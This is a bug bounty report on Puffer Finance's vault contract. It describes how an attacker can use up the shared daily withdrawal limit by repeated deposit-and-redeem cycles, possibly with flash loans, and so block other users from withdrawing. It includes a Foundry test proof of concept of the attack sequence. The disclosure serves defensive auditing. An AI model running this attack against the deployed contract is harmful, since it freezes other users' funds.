# 28645 - \[SC - Insight] Attacker Prevents All Users From Withdrawing Fu...

Submitted on Feb 22nd 2024 at 22:35:17 UTC by @misuz for [Boost | Puffer Finance](https://immunefi.com/bounty/pufferfinance-boost/)

Report ID: #28645

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0xd9a442856c234a39a81a089c06451ebaa4306a72>

Impacts:

* Temporary freezing of funds for at least 1 hour

## Description

## Vulnerability Details

In the `PufferVaultMainnet`contract, an attacker (who might potentially be a Puffer's competitor) can exploit the daily withdrawal limit by repeatedly depositing then withdrawing assets from the vault, deliberately making `_getPufferVaultStorage().assetsWithdrawnToday = _getPufferVaultStorage().dailyAssetsWithdrawalLimit` and `getRemainingAssetsDailyWithdrawalLimit() = 0`. This can be achieved using their own funds or funds obtained via a flash loan.

Even if the protocol raises the daily withdrawal limit, the attacker still can persist in exploiting this vulnerability until the daily limit is reached again. If the protocol then raises the daily limit to be unlimited, the attacker will continue depositing stETH and withdrawing WETH from the vault till when the liquidity of WETH and ETH in the vault is 0, resulting in all users of the protocol being unable to withdraw their assets from the vault.

## Impact Details

All funds deposited by users into the vault become inaccessible for withdrawal.

## Recommendation

It is recommended to implement a daily withdrawal limit for every user (on a user level) to mitigate the risk of this vulnerability.

## Proof of Concept

```
    // forge t --mt test_attacker_causes_freezing_of_funds -vvvv
    function test_attacker_causes_freezing_of_funds()
        public
        giveToken(BLAST_DEPOSIT, address(stETH), alice, 1000 ether)
        giveToken(BLAST_DEPOSIT, address(stETH), bob, 1000 ether)
        giveToken(MAKER_VAULT, address(_WETH), dave, 51 ether)
    {
        // Pre-mainnet version
        // Alice and Bob deposited 1k ETH
        vm.startPrank(alice);
        SafeERC20.safeIncreaseAllowance(
            IERC20(stETH),
            address(pufferVault),
            type(uint256).max
        );
        pufferVault.deposit(1000 ether, alice);

        vm.startPrank(bob);
        SafeERC20.safeIncreaseAllowance(
            IERC20(stETH),
            address(pufferVault),
            type(uint256).max
        );
        pufferVault.deposit(1000 ether, bob);

        // Upgraded to mainnet
        _upgradeToMainnetPuffer();

        // Dave - the attacker purposely deposits and withdraws assets so that the daily withdrawal limit is reached, causes freezing of funds
        vm.startPrank(dave);
        SafeERC20.safeIncreaseAllowance(
            _WETH,
            address(pufferVault),
            type(uint256).max
        );
        uint256 pufETHMintedFirst = pufferVault.deposit(50 ether, dave);

        PufferVaultMainnet(payable(address(pufferVault))).redeem(
            pufETHMintedFirst,
            dave,
            dave
        );
        uint256 pufETHMintedSecond = pufferVault.deposit(50 ether, dave);
        PufferVaultMainnet(payable(address(pufferVault))).redeem(
            pufETHMintedSecond,
            dave,
            dave
        );

        // Alice now can't withdaw
        vm.startPrank(alice);
        vm.expectRevert();
        pufferVault.withdraw(10 ether, alice, alice);
    }
```
